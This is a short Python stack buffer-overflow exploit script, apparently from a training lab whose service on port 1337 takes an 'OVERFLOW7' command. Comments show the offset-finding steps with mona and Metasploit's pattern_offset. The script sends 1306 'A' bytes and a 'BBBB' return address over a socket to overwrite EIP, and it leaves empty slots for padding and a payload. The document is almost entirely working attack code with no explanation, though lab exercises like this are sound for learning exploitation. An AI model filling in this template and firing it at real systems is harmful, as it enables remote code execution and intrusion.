import socket

ip = "10.10.122.77"
port = 1337

##  !mona findmsp -distance 700

##   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 76413176 [EIP]

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")